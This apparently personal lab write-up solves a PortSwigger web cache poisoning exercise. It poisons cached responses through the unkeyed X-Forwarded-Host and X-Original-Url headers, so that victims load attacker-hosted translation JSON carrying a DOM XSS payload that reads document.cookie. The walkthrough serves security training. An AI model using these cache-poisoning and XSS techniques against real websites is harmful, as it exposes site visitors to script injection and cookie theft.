# [Combining web cache poisoning vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

- open the lab in burp browser and send the `/` page to the repeater
- check if the page is a cache oracle (it is)
- check if the query can be a cachebuster

```
GET /?qwe=asd HTTP/2
...
```

- check for unkeyed elements with **Param miner**
- `Extensions` -> `Param Miner` -> `Guess everything`
- it will find the `x-forwarded-host` and the `x-original-url`
- lets try the `x-forwarded-host`

```
GET /?cb=qwe HTTP/2
Host: xxx.web-security-academy.net
X-Forwarded-Host: example.com
...
```

- the `X-Forwarded-Host` is not a cachebuster
- look up in the response if there are any `example.com` mentioned

```html
<script>
  data = { host: "example.com", path: "/" };
</script>
```

- lets check if the data is used somewhere

```html
<script>
  initTranslations("//" + data.host + "/resources/json/translations.json");
</script>
```

- lets check if the `initTranslations` or the `/resources/json/translations.json` is available in the **Target** -> **site map**

> the `/resources/json/translations.json` response:

```
HTTP/2 200 OK
...
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "espanol",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes",
            "Description:": "Descripcion:"
        }
    },
...
}
```

> the `/resources/js/translations.js` response has the `initTranslations`

- in the `/resources/js/translations.js` the following checks the cookie for the language value:

```js
const lang = document.cookie
  .split(";")
  .map((c) => c.trim().split("="))
  .filter((p) => p[0] === "lang")
  .map((p) => p[1])
  .find(() => true);
```

- the lang cookie set by this request's response

```
GET /setlang/es? HTTP/2
...
```

- response

```
HTTP/2 302 Found
...
Set-Cookie: lang=es; Path=/; Secure
...
```

- back to the `/resources/js/translations.js` the following **DOM** manipulation can be useful:

```js
const translate = (dict, el) => {
  for (const k in dict) {
    if (el.innerHTML === k) {
      el.innerHTML = dict[k];
    } else {
      el.childNodes.forEach((el_) => translate(dict, el_));
    }
  }
};
```

- the **DOM** **XSS** is the translation and the sink is the `el.innerHTML = dict[k];`

## lets build the exploit

- for the `/` request add the `X-Forwarded-Host` the exploit server

```
GET /?qwe=asd HTTP/2
...
X-Forwarded-Host: exploit-yyy.exploit-server.net
...
```

- in the exploit server give the file the translation path: `/resources/json/translations.json`
- for the head give the following:

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *
```

- for the body give the following `json`, one of the fields changed to see the diff:

```json
{
  "en": {
    "name": "English"
  },
  "es": {
    "name": "espanol",
    "translations": {
      "Return to list": "Volver a la lista",
      "View details": "duck",
      "Description:": "Descripcion:"
    }
  }
}
```

- first switch the language to spanish, the url will look like this:

`https://xxx.web-security-academy.net/?localized=1`

- the `/?localized=1` come handy later
- send the exploit request in burp (cache it)
- then check this url: `https://xxx.web-security-academy.net/?qwe=asd`
- the `view detail` button should change to `duck`
- the issue that the only poisoned version is the spanish
- somehow the user should be directed to spanish from english

> lets make the `/` page redirect to spanish version

- during language switch this is the request:

```
GET /setlang/es? HTTP/2
...
```

- the response redirects to `/?localized=1`
- this is what the victim will get as an `url`
- lets send it to the repeater and figure out how to make it cached
- on `/setlang/es?` it is not cached, probably because it has a cookie
- but the `/setlang/es//` version is cached
- lets use the `x-original-url` for redirection

> have to exploit build two request

- one the redirects the victim to the spanish language
- and one the provides on the freshly redirected page the exploit server

first:

```
GET / HTTP/2
...
X-Original-Url: /setlang/es//
...
```

second:

```
GET /?localized=1 HTTP/2
...
X-Forwarded-Host: exploit-0af500bc03b650b482f3008901790017.exploit-server.net
...
```

- in the exploit server change the body to this

```json
{
  "en": {
    "name": "English"
  },
  "es": {
    "name": "espanol",
    "translations": {
      "Return to list": "Volver a la lista",
      "View details": "<img src=1 onerror=alert(document.cookie) />",
      "Description:": "Descripcion:"
    }
  }
}
```

- cache the first request's response the the second
